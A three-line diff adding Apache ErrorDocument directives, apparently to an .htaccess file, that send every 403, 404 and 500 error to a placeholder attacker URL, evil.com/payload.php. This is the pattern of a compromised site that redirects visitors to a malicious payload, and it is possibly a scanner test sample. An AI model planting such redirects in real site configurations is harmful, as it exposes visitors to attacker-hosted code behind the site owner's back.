@@ -1,0 +1,3 @@
+ErrorDocument 403 http://evil.com/payload.php
+ErrorDocument 404 http://evil.com/payload.php
+ErrorDocument 500 http://evil.com/payload.php
